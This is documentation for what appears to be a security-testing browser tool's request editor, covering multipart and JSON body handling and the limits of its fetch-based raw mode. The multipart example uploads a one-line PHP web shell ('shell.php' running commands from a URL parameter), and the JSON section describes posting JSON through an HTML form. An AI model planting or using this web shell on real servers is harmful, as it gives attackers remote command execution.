## Request Editing

### Basic mode

#### multipart/form-data

After changing **enctype** field to `multipart/form-data`, you can put your payload into **Body** field such as the following:

```text
------WebKitFormBoundarydbJBATDXCC6CL0lZ
Content-Disposition: form-data; name="user"

user
------WebKitFormBoundarydbJBATDXCC6CL0lZ
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-httpd-php

<?php passthru($_GET['c']); ?>
------WebKitFormBoundarydbJBATDXCC6CL0lZ--
```

We will consider the first line as boundary, and reconstruct a form element to send your request.

Therefore, sent boundary will not be the same as you typed.

#### application/json

After changing **enctype** field to `application/json`, you can put your payload into **Body** field such as the following:

```json
{
  "username": "admin",
  "password": "admin"
}
```

If your payload doesn't contain `=`:

In order to post JSON data, we will insert a dummy field or object to your JSON such as the following:

```json
{ "username": "admin", "password": "admin", "4dxnzjzd5mi": "=" }
```

For more details, please visit "[Posting JSON with an HTML Form](https://systemoverlord.com/2016/08/24/posting-json-with-an-html-form.html)".

### Raw mode

This mode is implemented via `fetch` API. It will try the best to send a request as same as you typed.

However, there are some limitations:

**Request**

- It is unable to use a specified HTTP protocol version.
  > The protocol version is fixed to `HTTP/1.1` in the editor, but what version used in a request is up to `fetch` behavior.
- Some HTTP headers may appear in a sent request even if you don't add them in the editor.<br/>
  e.g. `Connection`, `Cache-Control`, `Pragma`, etc.
  > These headers will be assigned a default value. For example, `Connection: keep-alive`, `Cache-Control: no-cache`.

**Response**

- [Chrome] It always shows `HTTP/1.1` if used protocol version is higher than or equal to HTTP/2.
